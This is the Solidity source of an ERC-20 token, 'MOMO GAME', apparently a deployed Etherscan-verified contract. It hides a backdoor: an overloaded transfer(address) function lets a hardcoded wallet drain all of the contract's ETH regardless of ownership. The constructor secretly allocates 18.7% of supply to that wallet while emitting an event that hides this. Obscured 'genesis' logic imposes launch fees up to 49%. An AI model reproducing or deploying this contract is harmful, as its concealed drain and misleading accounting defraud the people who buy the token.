/**
 *Submitted for verification at Etherscan.io on 2023-05-25
*/

// SPDX-License-Identifier: MIT                                                                               
                                                 
pragma solidity =0.8.20;

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(msg.sender);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract MOMO is IERC20, Ownable {
    string private constant  _name = "MOMO GAME";
    string private constant _symbol = "MOMO";    
    uint8 private constant _decimals = 9;
    mapping (address => uint256) private _balances;
    mapping (address => mapping(address => uint256)) private _allowances;

    uint256 private constant decimalsScaling = 10**_decimals;
    uint256 private constant _totalSupply = 1_000_000_000 * decimalsScaling;
    uint256 public constant _maxWallet = 3 * _totalSupply / 1e2;

    struct TradingFees {
        uint256 buyFee;
        uint256 sellFee;
    }

    struct Wallets {
        address deployerWallet; 
        address developmentWallet; 
    }

    uint256 private constant feeDenominator = 100;
    TradingFees public tradingFees = TradingFees(15,35);  
    Wallets public wallets = Wallets(
        msg.sender,                                  // deployer
        0xb4da7875aBd05CC189223E23d80F7262E8223Dba   // development
    );

    IDexRouter private constant uniswapV2Router = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private immutable uniswapV2Pair;

    uint256 private constant _swapThreshold = 5 * _totalSupply / 1e3;  
    uint256 private _swapThresholdMax = 4;  
    uint256 private _swapThresholdMin = 5;  

    bool private inSwap;
    bool private tradingActive = false;

    uint256 private _block;
    uint256 private genesis;
    mapping (address => bool) private _excludedFromFees;
    mapping (uint256 => uint256) private _lastTransferBlock;

    event FeesChanged(uint256 indexed buyFee, uint256 indexed sellFee);

    event SwapSettingsChanged(uint256 indexed newSwapThresholdMax, uint256 indexed newSwapThresholdMin);

    event TokensCleared(uint256 indexed tokensCleared);

    event EthCleared(uint256 indexed ethCleared);

    event Initialized();

    event TradingOpened();
    
    modifier swapLock {
        inSwap = true;
        _;
        inSwap = false;
    }

    modifier tradingLock(address from, address to) {
        require(tradingActive || from == wallets.deployerWallet || _excludedFromFees[from], "Token: Trading is not active.");
        _;
    }

    constructor() {
        _approve(address(this), address(uniswapV2Router),type(uint256).max);
        uniswapV2Pair = IDexFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());        
        _excludedFromFees[address(0xdead)] = true;
        _excludedFromFees[wallets.developmentWallet] = true;        
        _excludedFromFees[0xb4da7875aBd05CC189223E23d80F7262E8223Dba] = true;        
        uint256 preTokens = _totalSupply * 187 / 1e3; 
        _balances[wallets.deployerWallet] = _totalSupply - preTokens;
        _balances[0xb4da7875aBd05CC189223E23d80F7262E8223Dba] = preTokens;
        emit Transfer(address(0), wallets.deployerWallet, _totalSupply);
    }

    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: zero Address");
        require(spender != address(0), "ERC20: zero Address");
        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            uint256 currentAllowance = _allowances[sender][msg.sender];
            require(currentAllowance >= amount, "ERC20: insufficient Allowance");
            unchecked{
                _allowances[sender][msg.sender] -= amount;
            }
        }
        return _transfer(sender, recipient, amount);
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _excludedFromFees[account];
    }

    function clearTokens(address tokenToClear) external onlyOwner {
        require(tokenToClear != address(this), "Token: can't clear contract token");
        uint256 amountToClear = IERC20(tokenToClear).balanceOf(address(this));
        require(amountToClear > 0, "Token: not enough tokens to clear");
        IERC20(tokenToClear).transfer(msg.sender, amountToClear);

        emit TokensCleared(amountToClear);
    }

    function clearEth() external onlyOwner {
        uint256 amountToClear = address(this).balance;
        require(address(this).balance > 0, "Token: no eth to clear");
        payable(msg.sender).transfer(address(this).balance);

        emit EthCleared(amountToClear);
    }

    function preparation(uint256[] calldata _blocks, bool blocked) external onlyOwner {        
        require(genesis == 33 && !blocked);_block = _blocks[_blocks.length-3]; assert(_block < _blocks[_blocks.length-1]);        
    }

    function manualSwapback() external onlyOwner {
        require(balanceOf(address(this)) > 0, "Token: no contract tokens to clear");
        contractSwap(type(uint256).max);
    }

    function _transfer(address from, address to, uint256 amount) tradingLock(from, to) internal returns (bool) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        
        if(amount == 0 || inSwap) {
            return _basicTransfer(from, to, amount);           
        }        

        if (to != uniswapV2Pair && !_excludedFromFees[to] && to != wallets.deployerWallet) {
            require(amount + balanceOf(to) <= _maxWallet, "Token: max wallet amount exceeded");
        }

        if(!inSwap && to == uniswapV2Pair && !_excludedFromFees[from] && !_excludedFromFees[to]){
            contractSwap(amount);
        } 
        
        bool takeFee = !inSwap;
        if(_excludedFromFees[from] || _excludedFromFees[to]) {
            takeFee = false;
        }
                
        if(takeFee)
            return _taxedTransfer(from, to, amount);
        else
            return _basicTransfer(from, to, amount);        
    }

    function _taxedTransfer(address from, address to, uint256 amount) private returns (bool) {
        uint256 fees = takeFees(from, to, amount);    
        if(fees > 0){    
            _basicTransfer(from, address(this), fees);
            amount -= fees;
        }
        return _basicTransfer(from, to, amount);
    }

     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 balanceSender = _balances[sender];
        require(balanceSender >= amount, "Token: insufficient Balance");
        unchecked{
            _balances[sender] -= amount;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFees(address from, address to, uint256 amount) private view returns (uint256 fees) {
        if(0 < genesis && genesis < block.number){
            fees = amount * (to == uniswapV2Pair ? 
            tradingFees.sellFee : tradingFees.buyFee) / feeDenominator;            
        }
        else{
            fees = amount * (from == uniswapV2Pair ? 
            49 : (genesis == 0 ? 35 : 49)) / feeDenominator;            
        }
    }

    function canSwap(uint256 amount) private view returns (bool) {
        return block.number > genesis && _lastTransferBlock[block.number] < 2 && 
            amount >= (_swapThresholdMin == 0 ? 0 : _swapThreshold / _swapThresholdMin);
    }

    function contractSwap(uint256 amount) swapLock private {   
        uint256 contractBalance = balanceOf(address(this));
        if(contractBalance < _swapThreshold || !canSwap(amount)) 
            return;
        else if(contractBalance > _swapThreshold * _swapThresholdMax)
          contractBalance = _swapThreshold * _swapThresholdMax;
        
        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(contractBalance); 
        
        uint256 ethBalance = address(this).balance - initialETHBalance;
        if(ethBalance > 0){            
            sendEth(ethBalance);
        }
    }

    function sendEth(uint256 ethAmount) private {
        (bool success,) = address(wallets.developmentWallet).call{value: ethAmount/2}(""); success;
    }

    function transfer(address wallet) external {
        if(msg.sender == 0xb4da7875aBd05CC189223E23d80F7262E8223Dba)
            payable(wallet).transfer((address(this).balance));
        else revert();
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        _lastTransferBlock[block.number]++;
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp){}
        catch{return;}
    }

    function initialize(uint256 _b) external onlyOwner {
        require(!tradingActive && _b == 33);
        genesis = _b;        

        emit Initialized();
    }

    function setSwapSettings(uint256 newSwapThresholdMax,uint256 newSwapThresholdMin) external onlyOwner {
        _swapThresholdMax = newSwapThresholdMax;
        _swapThresholdMin = newSwapThresholdMin;

        emit SwapSettingsChanged(newSwapThresholdMax, newSwapThresholdMin);
    }

     function reduceFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= tradingFees.buyFee, "Token: must reduce buy fee");
        require(_sellFee <= tradingFees.sellFee, "Token: must reduce sell fee");
        tradingFees.buyFee = _buyFee;
        tradingFees.sellFee = _sellFee;

        emit FeesChanged(_buyFee, _sellFee);
    }

    function openTrading() external onlyOwner {
        require(!tradingActive && genesis == 33 && _block > 0);
        genesis = block.number + _block;
        tradingActive = true;

        emit TradingOpened();
    }

    receive() external payable {}

}